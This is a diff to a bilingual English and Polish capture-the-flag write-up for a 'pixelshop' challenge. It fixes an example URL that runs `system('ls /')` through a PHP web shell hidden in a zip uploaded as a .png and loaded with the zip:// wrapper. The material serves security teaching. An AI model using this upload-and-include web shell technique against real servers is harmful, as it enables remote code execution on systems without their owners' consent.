@@ -90,7 +90,7 @@ Which can be also unzipped, and inside stores `s.php` file with a simple PHP she
 
 With this file safely uploaded in the server as `847cf5ebb78615e61ab646189e3ffbff138801ad.png` we can finally run:
 
-`http://pixelshop.pwning.xxx/?a=system&b=ls&op=zip://uploads/847cf5ebb78615e61ab646189e3ffbff138801ad.png%23s`
+`http://pixelshop.pwning.xxx/?a=system&b=ls /&op=zip://uploads/847cf5ebb78615e61ab646189e3ffbff138801ad.png%23s`
 
 Which runs `system('ls /')`.
 
@@ -189,7 +189,7 @@ Który może zostać odpakowany a w środku zawiera plik `s.php` z prostym php s
 
 Z tym plikiem bezpiecznie leżącym na serwerze jako `847cf5ebb78615e61ab646189e3ffbff138801ad.png` możemy wreszcie uruchomić:
 
-`http://pixelshop.pwning.xxx/?a=system&b=ls&op=zip://uploads/847cf5ebb78615e61ab646189e3ffbff138801ad.png%23s`
+`http://pixelshop.pwning.xxx/?a=system&b=ls /&op=zip://uploads/847cf5ebb78615e61ab646189e3ffbff138801ad.png%23s`
 
 Co daje nam przykładowo `system('ls /')`.
 
